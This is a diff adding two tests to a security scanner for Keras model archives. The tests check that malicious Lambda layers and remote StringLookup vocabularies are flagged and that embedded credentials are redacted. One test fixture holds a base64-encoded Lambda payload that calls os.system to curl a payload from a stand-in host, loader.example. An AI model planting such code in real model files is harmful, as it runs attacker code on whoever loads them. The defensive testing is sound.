@@ -951,6 +951,32 @@ class TestKerasZipScanner:
         assert "X-Amz-Signature=<redacted>" in preview
         assert "Authorization: <redacted>" in preview
 
+    def test_lambda_code_preview_redacts_custom_scheme_url_credentials(self, tmp_path: Path) -> None:
+        scanner = KerasZipScanner()
+        malicious_code = "__import__('os').system('curl gopher://user:pass@loader.example/payload')"
+        encoded_code = base64.b64encode(malicious_code.encode()).decode()
+        config = {
+            "class_name": "Functional",
+            "config": {
+                "layers": [
+                    {
+                        "class_name": "Lambda",
+                        "name": "lambda_1",
+                        "config": {"function": [encoded_code, None, None], "function_type": "lambda"},
+                    },
+                ],
+            },
+        }
+        keras_path = create_configured_keras_zip(tmp_path, config, keras_version="3.0.0")
+
+        result = scanner.scan(str(keras_path))
+
+        serialized = result.to_json()
+        dangerous_lambda = [check for check in result.checks if check.name == "Dangerous Lambda Layer"]
+        assert len(dangerous_lambda) == 1
+        assert "user:pass" not in serialized
+        assert "gopher://<credentials-redacted>@loader.example/payload" in dangerous_lambda[0].details["code_preview"]
+
     def test_lambda_dict_code_preview_redacts_secret_bearing_evidence(self, tmp_path: Path) -> None:
         scanner = KerasZipScanner()
         path_token = "Aa1Bb2Cc3Dd4Ee5Ff6Gg7Hh8Ii9Jj0"
@@ -1726,6 +1752,36 @@ __import__('pickle').loads(data)
             cve_checks[0].details["vocabulary"]
             == "gopher://<credentials-redacted>@loader.example/vocab.txt?token=<redacted>&ok=1"
         )
+
+    def test_stringlookup_vocabulary_evidence_redacts_nested_authorization_query(self, tmp_path: Path) -> None:
+        scanner = KerasZipScanner()
+        config = {
+            "class_name": "Sequential",
+            "config": {
+                "layers": [
+                    {
+                        "class_name": "StringLookup",
+                        "name": "string_lookup",
+                        "config": {
+                            "vocabulary": (
+                                "https://loader.example/vocab.txt?"
+                                "headers=Authorization%3A%20Bearer%20VOCABSECRET123&ok=1"
+                            )
+                        },
+                    },
+                ],
+            },
+        }
+
+        model_path = create_configured_keras_zip(tmp_path, config, keras_version="3.11.3")
+        result = scanner.scan(str(model_path))
+
+        serialized = result.to_json()
+        cve_checks = [check for check in result.checks if check.details.get("cve_id") == "CVE-2025-12058"]
+        assert len(cve_checks) == 1
+        assert "VOCABSECRET123" not in serialized
+        assert "headers=<redacted>" in cve_checks[0].details["vocabulary"]
+        assert "ok=1" in cve_checks[0].details["vocabulary"]
 
     def test_stringlookup_vocabulary_evidence_redacts_plain_path_capabilities(self, tmp_path: Path) -> None:
         scanner = KerasZipScanner()
